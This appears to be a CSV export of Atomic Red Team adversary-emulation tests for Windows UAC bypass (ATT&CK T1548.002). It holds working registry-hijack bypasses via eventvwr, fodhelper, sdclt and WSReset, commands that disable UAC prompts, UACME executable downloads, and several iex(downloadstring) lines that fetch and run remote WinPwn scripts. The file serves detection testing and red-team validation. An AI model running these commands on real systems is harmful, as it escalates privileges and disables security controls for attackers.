",windows,,,"Start-Process #{MSP360_Connect_Path}
",powershell,True,,"Stop-Process -Name ""Connect"" -force -erroraction silentlycontinue
",powershell,"dependencies.0.description: MSP360 must exist at (#{MSP360_Connect_Path})

dependencies.0.prereq_command: if (Test-Path #{MSP360_Connect_Path}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\msp360connect.exe"" ""https://s3.amazonaws.com/cb_setups/_current/cbra/setup.exe?X-Amz-Expires=604800&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA2WIZE3YN7NOSY65U/20230515/us-east-1/s3/aws4_request&X-Amz-Date=20230515T024742Z&X-Amz-SignedHeaders=host&response-content-disposition=attachment;filename=ConnectStandaloneSetup_v3.3.0.15_netv4.5.1_cFA9100C6.exe&X-Amz-Signature=1fe3ddf93f8431b182fac90341f80a4ebf8665ddcc0e36dd385ee20d0ce865c9""
start-process ""PathToAtomicsFolder\..\ExternalPayloads\msp360connect.exe"" /S    

","input_arguments.MSP360_Connect_Path.description: Path of MSP360 executable

input_arguments.MSP360_Connect_Path.type: path

input_arguments.MSP360_Connect_Path.default: $env:ProgramFiles\Connect\Connect.exe

"
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Bypass UAC using Event Viewer (cmd),5073adf8-9a50-4bd9-b298-a9bd2ead8af9,"Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
Upon execution command prompt should be launched with administrative privileges. 
",windows,,,"reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ""#{executable_binary}"" /f
cmd.exe /c eventvwr.msc
",command_prompt,,,"reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
",,,"input_arguments.executable_binary.description: Binary to execute with UAC Bypass

input_arguments.executable_binary.type: path

input_arguments.executable_binary.default: C:\Windows\System32\cmd.exe

"
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Bypass UAC using Event Viewer (PowerShell),a6ce9acf-842a-4af6-8f79-539be7608e2b,"PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
Upon execution command prompt should be launched with administrative privalages
",windows,,,"New-Item ""HKCU:\software\classes\mscfile\shell\open\command"" -Force
Set-ItemProperty ""HKCU:\software\classes\mscfile\shell\open\command"" -Name ""(default)"" -Value ""#{executable_binary}"" -Force
Start-Process ""C:\Windows\System32\eventvwr.msc""
",powershell,,,"Remove-Item ""HKCU:\software\classes\mscfile"" -force -Recurse -ErrorAction Ignore
",,,"input_arguments.executable_binary.description: Binary to execute with UAC Bypass

input_arguments.executable_binary.type: path

input_arguments.executable_binary.default: C:\Windows\System32\cmd.exe

"
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Bypass UAC using Fodhelper,58f641ea-12e3-499a-b684-44dee46bd182,"Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
Upon execution, ""The operation completed successfully."" will be shown twice and command prompt will be opened.
",windows,,,"reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d ""#{executable_binary}"" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v ""DelegateExecute"" /f
fodhelper.exe
",command_prompt,,,"reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
",,,"input_arguments.executable_binary.description: Binary to execute with UAC Bypass

input_arguments.executable_binary.type: path

input_arguments.executable_binary.default: C:\Windows\System32\cmd.exe

"
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Bypass UAC using Fodhelper - PowerShell,3f627297-6c38-4e7d-a278-fc2563eaaeaa,"PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
Upon execution command prompt will be opened.
",windows,,,"New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force
New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force
Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value ""#{executable_binary}"" -Force
Start-Process ""C:\Windows\System32\fodhelper.exe""
",powershell,,,"Remove-Item ""HKCU:\software\classes\ms-settings"" -force -Recurse -ErrorAction Ignore
",,,"input_arguments.executable_binary.description: Binary to execute with UAC Bypass

input_arguments.executable_binary.type: path

input_arguments.executable_binary.default: C:\Windows\System32\cmd.exe

"
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Bypass UAC using ComputerDefaults (PowerShell),3c51abf2-44bf-42d8-9111-dc96ff66750f,"PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10
Upon execution administrative command prompt should open
",windows,,,"New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force
New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force
Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value ""#{executable_binary}"" -Force
Start-Process ""C:\Windows\System32\ComputerDefaults.exe""
",powershell,,,"Remove-Item ""HKCU:\software\classes\ms-settings"" -force -Recurse -ErrorAction Ignore
",,,"input_arguments.executable_binary.description: Binary to execute with UAC Bypass

input_arguments.executable_binary.type: path

input_arguments.executable_binary.default: C:\Windows\System32\cmd.exe

"
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Bypass UAC by Mocking Trusted Directories,f7a35090-6f7f-4f64-bb47-d657bf5b10c1,"Creates a fake ""trusted directory"" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems
Upon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch
",windows,,,"mkdir ""\\?\C:\Windows \System32\""
copy ""#{executable_binary}"" ""\\?\C:\Windows \System32\mmc.exe""
mklink c:\testbypass.exe ""\\?\C:\Windows \System32\mmc.exe""
",command_prompt,True,,"rd ""\\?\C:\Windows \"" /S /Q >nul 2>nul
del ""c:\testbypass.exe"" >nul 2>nul
",,,"input_arguments.executable_binary.description: Binary to execute with UAC Bypass

input_arguments.executable_binary.type: path

input_arguments.executable_binary.default: C:\Windows\System32\cmd.exe

"
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Bypass UAC using sdclt DelegateExecute,3be891eb-4608-4173-87e8-78b494c029b7,"Bypasses User Account Control using a fileless method, registry only.
Upon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe
[Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)
Adapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)
",windows,,,"New-Item -Force -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Value '#{command_to_execute}'
New-ItemProperty -Force -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""DelegateExecute""
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3
",powershell,,,"Remove-Item -Path ""HKCU:\Software\Classes\Folder"" -Recurse -Force -ErrorAction Ignore
",,,"input_arguments.command_to_execute.description: Command to execute

input_arguments.command_to_execute.type: string

input_arguments.command_to_execute.default: cmd.exe /c notepad.exe

"
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Disable UAC using reg.exe,9e8af564-53ec-407e-aaa8-3cb20c3af7f9,"Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA from 1 to 0
",windows,,,"reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
",command_prompt,True,,"reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
",,,
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Bypass UAC using SilentCleanup task,28104f8a-4ff1-4582-bcf6-699dce156608,"Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/

There is an auto-elevated task called SilentCleanup located in %windir%\system32\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).

For example, we can set the windir registry kye to: ""cmd /k REM ""

And forcefully run SilentCleanup task:

schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

REM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.
",windows,,,"""#{file_path}""
",command_prompt,False,,,,,"input_arguments.file_path.description: Path to the bat file

input_arguments.file_path.type: string

input_arguments.file_path.default: PathToAtomicsFolder\T1548.002\src\T1548.002.bat

"
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,UACME Bypass Method 23,8ceab7a2-563a-47d2-b5ba-0995211128d7,"Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.

Author: Leo Davidson derivative

Type:	Dll Hijack

Method: IFileOperation

Target:	\system32\pkgmgr.exe

Component: DismCore.dll

Implementation:	ucmDismMethod

UCM Method:	UacMethodDISM

https://github.com/hfiref0x/UACME
",windows,,,"""#{uacme_exe}""
",command_prompt,,,"powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
",powershell,"dependencies.0.description: UACME executable must exist on disk at specified location (""#{uacme_exe}"")

dependencies.0.prereq_command: $tempPath = cmd /c echo #{uacme_exe}
if (Test-Path ""$tempPath"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\uacme"" -Force
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"" -Force

","input_arguments.uacme_exe.description: Path to uacme executable

input_arguments.uacme_exe.type: path

input_arguments.uacme_exe.default: PathToAtomicsFolder\..\ExternalPayloads\uacme\23 Akagi64.exe

"
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,UACME Bypass Method 31,b0f76240-9f33-4d34-90e8-3a7d501beb15,"Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.

Author: Enigma0x3

Type:	Shell API

Method: Registry key manipulation

Target:	\system32\sdclt.exe

Component: Attacker defined

Implementation:	ucmSdcltIsolatedCommandMethod

UCM Method:	UacMethodShellSdclt

https://github.com/hfiref0x/UACME
",windows,,,"""#{uacme_exe}""
",command_prompt,,,"powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
",powershell,"dependencies.0.description: UACME executable must exist on disk at specified location (""#{uacme_exe}"")

dependencies.0.prereq_command: $tempPath = cmd /c echo #{uacme_exe}
if (Test-Path ""$tempPath"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\uacme"" -Force
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"" -Force

","input_arguments.uacme_exe.description: Path to uacme executable

input_arguments.uacme_exe.type: path

input_arguments.uacme_exe.default: PathToAtomicsFolder\..\ExternalPayloads\uacme\31 Akagi64.exe

"
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,UACME Bypass Method 33,e514bb03-f71c-4b22-9092-9f961ec6fb03,"Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.

Author: winscripting.blog

Type:	Shell API

Method: Registry key manipulation

Target:	\system32\fodhelper.exe

Component:	Attacker defined

Implementation:	ucmShellRegModMethod

UCM Method:	UacMethodMsSettings2

https://github.com/hfiref0x/UACME
",windows,,,"""#{uacme_exe}""
",command_prompt,,,"powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
",powershell,"dependencies.0.description: UACME executable must exist on disk at specified location (""#{uacme_exe}"")

dependencies.0.prereq_command: $tempPath = cmd /c echo #{uacme_exe}
if (Test-Path ""$tempPath"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\uacme"" -Force
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"" -Force

","input_arguments.uacme_exe.description: Path to uacme executable

input_arguments.uacme_exe.type: path

input_arguments.uacme_exe.default: PathToAtomicsFolder\..\ExternalPayloads\uacme\33 Akagi64.exe

"
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,UACME Bypass Method 34,695b2dac-423e-448e-b6ef-5b88e93011d6,"Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.

Author: James Forshaw

Type:	Shell API

Method: Environment variables expansion

Target:	\system32\svchost.exe via \system32\schtasks.exe

Component:	Attacker defined

Implementation:	ucmDiskCleanupEnvironmentVariable

UCM Method:	UacMethodDiskSilentCleanup

https://github.com/hfiref0x/UACME
",windows,,,"""#{uacme_exe}""
",command_prompt,,,"powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
",powershell,"dependencies.0.description: UACME executable must exist on disk at specified location (""#{uacme_exe}"")

dependencies.0.prereq_command: $tempPath = cmd /c echo #{uacme_exe}
if (Test-Path ""$tempPath"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\uacme"" -Force
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"" -Force

","input_arguments.uacme_exe.description: Path to uacme executable

input_arguments.uacme_exe.type: path

input_arguments.uacme_exe.default: PathToAtomicsFolder\..\ExternalPayloads\uacme\34 Akagi64.exe

"
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,UACME Bypass Method 39,56163687-081f-47da-bb9c-7b231c5585cf,"Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.

Author: Stefan Kanthak

Type:	Dll Hijack

Method: .NET Code Profiler

Target:	\system32\mmc.exe

Component:	Attacker defined

Implementation:	ucmCorProfilerMethod

UCM Method:	UacMethodCorProfiler

https://github.com/hfiref0x/UACME
",windows,,,"""#{uacme_exe}""
",command_prompt,,,"powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
",powershell,"dependencies.0.description: UACME executable must exist on disk at specified location (""#{uacme_exe}"")

dependencies.0.prereq_command: $tempPath = cmd /c echo #{uacme_exe}
if (Test-Path ""$tempPath"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\uacme"" -Force
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"" -Force

","input_arguments.uacme_exe.description: Path to uacme executable

input_arguments.uacme_exe.type: path

input_arguments.uacme_exe.default: PathToAtomicsFolder\..\ExternalPayloads\uacme\39 Akagi64.exe

"
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,UACME Bypass Method 56,235ec031-cd2d-465d-a7ae-68bab281e80e,"Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.

Author: Hashim Jawad

Type:	Shell API

Method: Registry key manipulation

Target:	\system32\WSReset.exe

Component:	Attacker defined

Implementation:	ucmShellRegModMethod

UCM Method:	UacMethodShellWSReset

https://github.com/hfiref0x/UACME
",windows,,,"""#{uacme_exe}""
",command_prompt,,,"powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
",powershell,"dependencies.0.description: UACME executable must exist on disk at specified location (""#{uacme_exe}"")

dependencies.0.prereq_command: $tempPath = cmd /c echo #{uacme_exe}
if (Test-Path ""$tempPath"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\uacme"" -Force
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"" -Force

","input_arguments.uacme_exe.description: Path to uacme executable

input_arguments.uacme_exe.type: path

input_arguments.uacme_exe.default: PathToAtomicsFolder\..\ExternalPayloads\uacme\56 Akagi64.exe

"
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,UACME Bypass Method 59,dfb1b667-4bb8-4a63-a85e-29936ea75f29,"Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.

Author: James Forshaw

Type:	AppInfo ALPC

Method: RAiLaunchAdminProcess and DebugObject

Target:	Attacker defined

Component:	Attacker defined

Implementation:	ucmDebugObjectMethod

UCM Method:	UacMethodDebugObject

https://github.com/hfiref0x/UACME
",windows,,,"""#{uacme_exe}""
",command_prompt,,,"powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
",powershell,"dependencies.0.description: UACME executable must exist on disk at specified location (""#{uacme_exe}"")

dependencies.0.prereq_command: $tempPath = cmd /c echo #{uacme_exe}
if (Test-Path ""$tempPath"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\uacme"" -Force
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"" -Force

","input_arguments.uacme_exe.description: Path to uacme executable

input_arguments.uacme_exe.type: path

input_arguments.uacme_exe.default: PathToAtomicsFolder\..\ExternalPayloads\uacme\59 Akagi64.exe

"
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,UACME Bypass Method 61,7825b576-744c-4555-856d-caf3460dc236,"Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.

Author: Enigma0x3/bytecode77 derivative by Nassim Asrir

Type:	Shell API

Method: Registry key manipulation

Target:	\system32\slui.exe, \system32\changepk.exe

Component:	Attacker defined

Implementation:	ucmShellRegModMethod

UCM Method:	UacMethodDebugObject

https://github.com/hfiref0x/UACME
",windows,,,"""#{uacme_exe}""
",command_prompt,,,"powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
",powershell,"dependencies.0.description: UACME executable must exist on disk at specified location (""#{uacme_exe}"")

dependencies.0.prereq_command: $tempPath = cmd /c echo #{uacme_exe}
if (Test-Path ""$tempPath"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\uacme"" -Force
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"" -Force

","input_arguments.uacme_exe.description: Path to uacme executable

input_arguments.uacme_exe.type: path

input_arguments.uacme_exe.default: PathToAtomicsFolder\..\ExternalPayloads\uacme\61 Akagi64.exe

"
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,WinPwn - UAC Magic,964d8bf8-37bc-4fd3-ba36-ad13761ebbcc,UAC bypass using Magic technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command ""C:\windows\system32\cmd.exe"" -technique magic",powershell,,,,,,
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,WinPwn - UAC Bypass ccmstp technique,f3c145f9-3c8d-422c-bd99-296a17a8f567,UAC bypass using ccmstp technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command ""C:\windows\system32\calc.exe"" -technique ccmstp",powershell,,,,,,
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,WinPwn - UAC Bypass DiskCleanup technique,1ed67900-66cd-4b09-b546-2a0ef4431a0c,UAC bypass using DiskCleanup technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command ""C:\windows\system32\cmd.exe"" -technique DiskCleanup",powershell,,,,,,
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,WinPwn - UAC Bypass DccwBypassUAC technique,2b61977b-ae2d-4ae4-89cb-5c36c89586be,UAC Bypass DccwBypassUAC technique via function of WinPwn,windows,,,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1'),powershell,,,,,,
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key,251c5936-569f-42f4-9ac2-87a173b9e9b8,"Disable User Account Conrol (UAC) for admin by setting the registry key 
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin to 0.

[MedusaLocker Ransomware](https://cloudsek.com/technical-analysis-of-medusalocker-ransomware/), 
[Purple Fox Rootkit](https://blogs.blackberry.com/en/2022/01/threat-thursday-purple-fox-rootkit), 
[Avaddon Ransomware](https://blogs.blackberry.com/en/2021/06/threat-thursday-avaddon-ransomware-uses-ddos-attacks-as-triple-threat)
",windows,,,"$orgValue =(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force",powershell,True,,"Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value $orgValue -Type Dword -Force
",,,
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,UAC Bypass with WSReset Registry Modification,3b96673f-9c92-40f1-8a3e-ca060846f8d9,"The following UAC bypass is focused on a registry key under ""HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"" that will trigger a command once wsreset.exe runs. 
This bypass is limited to Windows 10 1803/1809 and may not run on Server platforms. The registry mod is where interest will be.
If successful, the command to run will spawn off wsreset.exe. 
[UAC Bypass in Windows 10 Store Binary](https://0x1.gitlab.io/exploit/UAC-Bypass-in-Windows-10-Store-Binary/)
",windows,,,"New-Item #{commandpath} -Force | Out-Null
New-ItemProperty -Path #{commandpath} -Name ""DelegateExecute"" -Value """" -Force | Out-Null
Set-ItemProperty -Path #{commandpath} -Name ""(default)"" -Value ""#{commandtorun}"" -Force -ErrorAction SilentlyContinue | Out-Null
$Process = Start-Process -FilePath ""C:\Windows\System32\WSReset.exe"" -WindowStyle Hidden",powershell,,,"Remove-Item #{commandpath} -Recurse -Force
",,,"input_arguments.commandpath.description: Registry path

input_arguments.commandpath.type: string

input_arguments.commandpath.default: HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command

input_arguments.commandtorun.description: Command to run

input_arguments.commandtorun.type: string

input_arguments.commandtorun.default: C:\Windows\System32\cmd.exe /c start cmd.exe

"
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Disable UAC - Switch to the secure desktop when prompting for elevation via registry key,85f3a526-4cfa-4fe7-98c1-dea99be025c7,"User Account Control (UAC) is a security mechanism for limiting the elevation of privileges, including administrative accounts, unless authorized. 
This setting ensures that the elevation prompt is only used in secure desktop mode.
Disable User Account Conrol (UAC) for secure desktop by setting the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop to 0.
",windows,,,Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force,powershell,True,,"Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 1 -Type Dword -Force
",,,
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Disable UAC notification via registry keys,160a7c77-b00e-4111-9e45-7c2a44eda3fd,"This atomic regarding UACDisableNotify pertains to the notification behavior of UAC. UAC is a critical security feature in Windows that prevents unauthorized changes to the operating system. It prompts the user for permission or an administrator password before allowing actions that could affect the system's operation or change settings that affect other users. The BlotchyQuasar RAT defense evasion activities that the adversary to disable UAC notifications makes it easier for malware and malicious software to execute with elevated privileges. [Article](https://securityintelligence.com/x-force/x-force-hive0129-targeting-financial-institutions-latam-banking-trojan/)
",windows,,,"reg add ""HKLM\SOFTWARE\Microsoft\Security Center"" /v UACDisableNotify /t REG_DWORD /d 1 /f
",command_prompt,,,"reg add ""HKLM\SOFTWARE\Microsoft\Security Center"" /v UACDisableNotify /t REG_DWORD /d 0 /f
",,,
